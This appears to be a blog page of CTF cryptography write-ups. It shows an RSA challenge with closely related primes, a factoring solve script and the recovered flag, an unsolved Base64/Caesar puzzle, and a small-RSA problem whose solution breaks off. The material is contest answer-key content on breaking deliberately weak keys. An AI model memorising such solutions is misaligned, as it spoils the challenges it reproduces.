e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h1 id=ctf>CTF<a hidden class=anchor aria-hidden=true href=#ctf>#</a></h1><h2 id=crypto>Crypto<a hidden class=anchor aria-hidden=true href=#crypto>#</a></h2><h3 id=crypto1>Crypto1<a hidden class=anchor aria-hidden=true href=#crypto1>#</a></h3><h4 id=problem>problem<a hidden class=anchor aria-hidden=true href=#problem>#</a></h4><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-18>18</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> flag <span style=color:#f92672>import</span> flag
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> random
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>next_prime</span>(n):
</span></span><span style=display:flex><span>    num <span style=color:#f92672>=</span> n <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> isPrime(num):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> num
</span></span><span style=display:flex><span>        num <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> random<span style=color:#f92672>.</span>randint(<span style=color:#ae81ff>1</span><span style=color:#f92672>&lt;&lt;</span><span style=color:#ae81ff>3071</span>,<span style=color:#ae81ff>1</span><span style=color:#f92672>&lt;&lt;</span><span style=color:#ae81ff>3072</span>)
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> next_prime(p)
</span></span><span style=display:flex><span>q <span style=color:#f92672>=</span> next_prime(p<span style=color:#f92672>*</span><span style=color:#ae81ff>10</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>N <span style=color:#f92672>=</span> p<span style=color:#f92672>*</span>q
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>65537</span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> pow(bytes_to_long(flag),e,N)
</span></span><span style=display:flex><span>print N<span style=color:#75715e>#247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159</span>
</span></span><span style=display:flex><span>print c<span style=color:#75715e>#152721025887735064764471379084548069204525956728140596238274397757947415316727016281416993518884790524343567541799262176820909148208728616947040227306302164641933331109468512979068186962047716308015535717796123080303496277784765187481185086876434873226524784636408104495312136956587251145463229424950634548624036265557622592089071331292811066840281494102799063634204855779210798330603868025111521826209601342683209160845433746624786171189961029265101816540639855230011618388675527443511618729301028631422873421421991470450059414988968787693753741941765791793672069240992955177930884210118700416564364129283739917229225845073750451244070534919112957275948312337882004219145847493047815403283126471638320784008475284616178697542301935170768573588093196019976675846311280356987370969400610196847990069257614148181804915868273001764028563852238142447411811579695265293746037324400494199877368049162903819737962946786971556872009326814914717430484711885484790156341127433550909206551293806568904858726942820132521566970376839336895645431303013575622422180179687172859250687080526393904583834607514619581478966664406178290247731116920836372943133394640322159512633671870473674514938423231596849301615200001553851411828993918474534316510609878376462094608058640335426907349648369552864820322464995077358198844334320833893207364879282292959161203675080110629771237503657412087961891443054530286088807186134851425688726147108076040204500951624929585070273336203814962656253259257806100191430918121713005141607192112560560371475173081441671613602480052062955279287813475764285469835557663176529059039540417149792518941598550609678298901186032272305421028365295602810159191055078633881059737011784127699357480578433240110432805495328517379885306237631225477566136721077348329866885731002878563684349453668924250445128775992616650275173644658245397235667490402628</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=solve>solve<a hidden class=anchor aria-hidden=true href=#solve>#</a></h4><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-26>26</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>n<span style=color:#f92672>=</span><span style=color:#ae81ff>247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159</span>
</span></span><span style=display:flex><span>c<span style=color:#f92672>=</span><span style=color:#ae81ff>152721025887735064764471379084548069204525956728140596238274397757947415316727016281416993518884790524343567541799262176820909148208728616947040227306302164641933331109468512979068186962047716308015535717796123080303496277784765187481185086876434873226524784636408104495312136956587251145463229424950634548624036265557622592089071331292811066840281494102799063634204855779210798330603868025111521826209601342683209160845433746624786171189961029265101816540639855230011618388675527443511618729301028631422873421421991470450059414988968787693753741941765791793672069240992955177930884210118700416564364129283739917229225845073750451244070534919112957275948312337882004219145847493047815403283126471638320784008475284616178697542301935170768573588093196019976675846311280356987370969400610196847990069257614148181804915868273001764028563852238142447411811579695265293746037324400494199877368049162903819737962946786971556872009326814914717430484711885484790156341127433550909206551293806568904858726942820132521566970376839336895645431303013575622422180179687172859250687080526393904583834607514619581478966664406178290247731116920836372943133394640322159512633671870473674514938423231596849301615200001553851411828993918474534316510609878376462094608058640335426907349648369552864820322464995077358198844334320833893207364879282292959161203675080110629771237503657412087961891443054530286088807186134851425688726147108076040204500951624929585070273336203814962656253259257806100191430918121713005141607192112560560371475173081441671613602480052062955279287813475764285469835557663176529059039540417149792518941598550609678298901186032272305421028365295602810159191055078633881059737011784127699357480578433240110432805495328517379885306237631225477566136721077348329866885731002878563684349453668924250445128775992616650275173644658245397235667490402628</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> gmpy2
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>k<span style=color:#f92672>=</span>gmpy2<span style=color:#f92672>.</span>iroot(n<span style=color:#f92672>//</span><span style=color:#ae81ff>10</span><span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>2</span>)[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>print(k)
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0xfffffff</span>):
</span></span><span style=display:flex><span>    f<span style=color:#f92672>=</span>k<span style=color:#f92672>-</span>i
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> i<span style=color:#f92672>%</span><span style=color:#ae81ff>10000</span><span style=color:#f92672>==</span><span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>        print(i,end<span style=color:#f92672>=</span><span style=color:#e6db74>&#34; &#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> n<span style=color:#f92672>%</span>f<span style=color:#f92672>==</span><span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>        print(i,n)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>=</span>f
</span></span><span style=display:flex><span>q<span style=color:#f92672>=</span>n<span style=color:#f92672>//</span>f
</span></span><span style=display:flex><span><span style=color:#66d9ef>assert</span>(p<span style=color:#f92672>*</span>q<span style=color:#f92672>==</span>n)
</span></span><span style=display:flex><span>phi<span style=color:#f92672>=</span>(p<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>*</span>(q<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>e<span style=color:#f92672>=</span> <span style=color:#ae81ff>65537</span>
</span></span><span style=display:flex><span>d<span style=color:#f92672>=</span>gmpy2<span style=color:#f92672>.</span>invert(e,phi)
</span></span><span style=display:flex><span>m<span style=color:#f92672>=</span>pow(c,d,n)
</span></span><span style=display:flex><span>print(long_to_bytes(m))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 4971490805710648894784063900603982138103528416416093113682856149525895474391965093292856360186270533203485404384261736770807923420477678768335595268260058770929420214670794184479653642688593773001265441972139034999789321709099375988424776953616924996952770970955016095518058970453801153351600603001621188113472370286189729979231943525793160692844078376540082324198649179890017101800683049489232021392715915700831833371902425005874555370189042455321691195416425399507551235346773377429357933240695935997956969841660473107352934178051894901298644110556291216221039424250078546978571086275993790666829060240691673857284132895978717935677825502362997789971900863003499701755174512295162461514926135376073693593713246781021035797102243028802222257489266812730745381990847604727619717567202686948267842932198278066304365500430012440700948799107940169074390644763691400614036677335457180241108468029814414775113509028739480597728378</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 0 59 247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159</span>
</span></span><span style=display:flex><span><span style=color:#75715e># b&#39;ISEC{simp13_crypt0}&#39;</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=crypto2>Crypto2<a hidden class=anchor aria-hidden=true href=#crypto2>#</a></h3><blockquote><p>基因会突变，BASE64与Caesar也变异
加密密文: AUikzgRpLWaVIEaeKrqkJiieLhhqvf6=
​ 格式: ISEC{ }</p></blockquote><p>我好像不太懂╮(╯▽╰)╭</p><h3 id=crypto3>Crypto3<a hidden class=anchor aria-hidden=true href=#crypto3>#</a></h3><h4 id=problem-1>problem<a hidden class=anchor aria-hidden=true href=#problem-1>#</a></h4><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>RSA(<span style=color:#ae81ff>829467319</span>, <span style=color:#ae81ff>48357</span>)
</span></span><span style=display:flex><span><span style=color:#ae81ff>322517722</span>,<span style=color:#ae81ff>575397051</span>,<span style=color:#ae81ff>76525646</span>,<span style=color:#ae81ff>768452152</span>,<span style=color:#ae81ff>107590034</span>,<span style=color:#ae81ff>710690594</span>,<span style=color:#ae81ff>322517722</span>,<span style=color:#ae81ff>174907762</span>,<span style=color:#ae81ff>343945760</span>,<span style=color:#ae81ff>763355610</span>,<span style=color:#ae81ff>301647581</span>,<span style=color:#ae81ff>349705569</span>,<span style=color:#ae81ff>575397051</span>,<span style=color:#ae81ff>76525646</span>,<span style=color:#ae81ff>410109929</span>,<span style=color:#ae81ff>322517722</span>,<span style=color:#ae81ff>497916224</span>,<span style=color:#ae81ff>228868281</span>,<span style=color:#ae81ff>228868281</span>,<span style=color:#ae81ff>741167939</span>,<span style=color:#ae81ff>497916224</span>,<span style=color:#ae81ff>450014050</span>,<span style=color:#ae81ff>322517722</span>,<span style=color:#ae81ff>322517722</span>,<span style=color:#ae81ff>126657310</span>,<span style=color:#ae81ff>349705569</span>,<span style=color:#ae81ff>322517722</span>,<span style=color:#ae81ff>707637171</span>,<span style=color:#ae81ff>76525646</span>,<span style=color:#ae81ff>527107437</span>,<span style=color:#ae81ff>710690594</span>,<span style=color:#ae81ff>685252839</span>,<span style=color:#ae81ff>450014050</span>,<span style=color:#ae81ff>349705569</span>,<span style=color:#ae81ff>388149253</span>,<span style=color:#ae81ff>710690594</span>,<span style=color:#ae81ff>763355610</span>,<span style=color:#ae81ff>211593791</span>,<span style=color:#ae81ff>707637171</span>,<span style=color:#ae81ff>369453331</span>,<span style=color:#ae81ff>228868281</span>,<span style=color:#ae81ff>541631545</span>,<span style=color:#ae81ff>397988536</span>,<span style=color:#ae81ff>322517722</span>,<span style=color:#ae81ff>12982396</span>,<span style=color:#ae81ff>107590034</span>,<span style=color:#ae81ff>387385119</span>,<span style=color:#ae81ff>322517722</span>,<span style=color:#ae81ff>685252839</span>,<span style=color:#ae81ff>710690594</span>,<span style=color:#ae81ff>322517722</span>,<span style=color:#ae81ff>109170298</span>,<span style=color:#ae81ff>349705569</span>,<span style=color:#ae81ff>763355610</span>,<span style=color:#ae81ff>349705569</span>,<span style=color:#ae81ff>349705569</span>,<span style=color:#ae81ff>37195518</span>,<span style=color:#ae81ff>25028382</span>,<span style=color:#ae81ff>610867628</span>,<span style=color:#ae81ff>44896265</span>,<span style=color:#ae81ff>25028382</span>,<span style=color:#ae81ff>454683367</span>,<span style=color:#ae81ff>15283689</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=solve-1>solve<a hidden class=anchor aria-hidden=true href=#solve-1>#</a></h4><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-13>13</a>
